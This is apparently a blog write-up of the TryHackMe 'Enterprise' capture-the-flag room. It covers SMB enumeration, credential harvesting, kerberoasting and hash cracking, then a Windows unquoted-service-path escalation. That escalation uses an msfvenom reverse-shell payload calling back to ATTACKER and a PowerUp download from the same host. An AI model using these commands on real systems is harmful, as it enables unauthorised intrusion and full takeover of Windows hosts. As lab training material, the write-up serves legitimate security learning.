---
title: "Enterprise"
date: 2024-03-18
draft: false
summary: "Writeup for Enterprise CTF challenge on TryHackMe."
tags: ["windows", "unquoted service path", "kerberoast", "hardcoded creds"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/enterprise/cover.webp"
  caption: "Enterprise TryHackMe Challenge"
  alt: "Enterprise cover"
platform: "TryHackMe"
---

You just landed in an internal network. You scan the network and there's only the Domain Controller...
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/enterprise

## Reconnaissance

I performed an **nmap** aggressive scan on the target to find open ports and the services running on them.

```shell
nmap -A -Pn -p- TARGET --min-rate 10000 -oN enterprise.nmap
```

![](https://cdn.ziomsec.com/enterprise/1.webp)

![](https://cdn.ziomsec.com/enterprise/2.webp)

## Initial Foothold

I accessed the web application running on port 80 and 7990.

![](https://cdn.ziomsec.com/enterprise/3.webp)

![](https://cdn.ziomsec.com/enterprise/4.webp)

I fuzzed hidden files and found a *robots.txt* file on the domain controllers web app. This seemed wierd so I accessed it through my browser.

```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
```

![](https://cdn.ziomsec.com/enterprise/5.webp)

However, I did not get any useful information. I then looked for smb shares using **smbclient**.

```shell
smbclient -L TARGET -U ""
```

![](https://cdn.ziomsec.com/enterprise/6.webp)

There were 2 interesting shares. I first accessed the *docs* share and downloaded the files present in it.

```shell
smbclient \\\\TARGET\\docs -U ""
```

![](https://cdn.ziomsec.com/enterprise/7.webp)

Both the documents were password protected, so I couldn't open it. I then accessed the *Users* share.

```
smbclient \\\\TARGET\\Users -U ""
```

![](https://cdn.ziomsec.com/enterprise/8.webp)

It had a bunch of files so I downloaded everything.

```
recurse on
prompt off
mget *
```

![](https://cdn.ziomsec.com/enterprise/9.webp)

I used the `find` command to look for files containing words like `history` or `secret` or something similar in their name and examined them.

```bash
find /root/thm/enterprise/APPADMIN/ -type f -name "*history*"
```

I found a credential inside a file called `Consolehost_history.txt`.

![](https://cdn.ziomsec.com/enterprise/10.webp)

![](https://cdn.ziomsec.com/enterprise/11.webp)

I tested the credential to see if I could use it for command execution but failed. The Atlassian login page said they were shifting to github, so i looked for its github.

I found the organization on github and viewed its members.

![](https://cdn.ziomsec.com/enterprise/12.webp)

I accessed the user profile and viewed the uploaded script. This revealed a new set of credentials.

![](https://cdn.ziomsec.com/enterprise/13.webp)

![](https://cdn.ziomsec.com/enterprise/14.webp)

These were valid credentials but it didn't allow executing commands.

```shell
nxc smb TARGET -u 'nik' -p 'ToastyBoi!'
```

![](https://cdn.ziomsec.com/enterprise/15.webp)

I used these credentials to look for any other share that might be reserved for the user. However, I found nothing.

```shell
nxc smb TARGET -u 'nik' -p 'ToastyBoi!' --shares
```

I then enumerated the users and found  the credential of another user in its description.

```shell
nxc smb TARGET -u 'nik' -p 'ToastyBoi!' --users
```

![](https://cdn.ziomsec.com/enterprise/16.webp)

I tested these creds aswell but it didnt provide access to the system.

```shell
nxc smb -u 'contractor-temp' -p 'Password123!'
nxc rdp -u 'contractor-temp' -p 'Password123!'
```

I then looked for kerberoastable accounts and got the kerberoast hash for the user `bitbucket`.

```shell
impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:'ToastyBoi!' -dc-ip TARGET -request
```

![](https://cdn.ziomsec.com/enterprise/17.webp)

I then cracked the hash using **john**

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt HASH
```

![](https://cdn.ziomsec.com/enterprise/18.webp)

Finally, I accessed the machine using this credential - through **rdp**.

```shell
xfreerdp /u:'bitbucket' /p:'littleredbucket' /v:TARGET
```

![](https://cdn.ziomsec.com/enterprise/19.webp)

I then accessed the user flag from the Desktop.

![](https://cdn.ziomsec.com/enterprise/20.webp)

## Privilege Escalation

I downloaded PowerUp for enumerating privilege escalation vectors.

```shell
iwr http://ATTACKER/PowerUp.ps1 -OutFile C:\temp\PowerUp.ps1
```

I ran **PowerUp** to look for misconfigurations in the local system.

```shell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

![](https://cdn.ziomsec.com/enterprise/21.webp)

It discovered an **unquoted service path** vulnerability.

```shell
sc.exe qc zerotieroneservice
```

![](https://cdn.ziomsec.com/enterprise/22.webp)

I then verified my access on the path of the exe.

```shell
cacls 'C:\Program Files (x86)\Zero Tier\'
```

![](https://cdn.ziomsec.com/enterprise/23.webp)

Since I had access, I created a payload using **msfvenom** and upload it on the vulnerable path.

```shell
msfvenom -p windows/shell_reverse_tcp lhost=ATTACKER lport=1234 -f exe-service -o ZeroTier.exe
```

![](https://cdn.ziomsec.com/enterprise/24.webp)

Finally, I started a listener on my local machine and restarted the service.

```
sc.exe stop zerotieroneservice
sc.exe start zerotieroneservice
```

![](https://cdn.ziomsec.com/enterprise/25.webp)

I got a reverse shell as **nt authority\system**.

![](https://cdn.ziomsec.com/enterprise/26.webp)

I then captured the root flag from **Administrator's** desktop.

```shell
more C:\Users\Administrator\Desktop\root.txt
```

![](https://cdn.ziomsec.com/enterprise/27.webp)

That's it from my end! Until next time :)

---
